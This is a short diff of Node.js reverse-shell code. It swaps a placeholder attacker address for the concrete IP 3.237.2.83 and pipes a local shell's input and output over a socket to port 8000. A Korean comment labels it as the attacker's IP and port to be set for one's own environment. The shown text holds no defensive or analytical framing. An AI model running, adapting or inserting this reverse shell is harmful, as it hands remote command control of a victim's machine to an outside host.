@@ -9,7 +9,7 @@
     var client = new net.Socket();
     
     // 공격자 IP와 포트 (여기를 본인 환경에 맞게 수정하세요)
-    client.connect(8000, "attacker server ip address", function () {
+    client.connect(8000, "3.237.2.83", function () {
       client.pipe(sh.stdin);
       sh.stdout.pipe(client);
       sh.stderr.pipe(client);
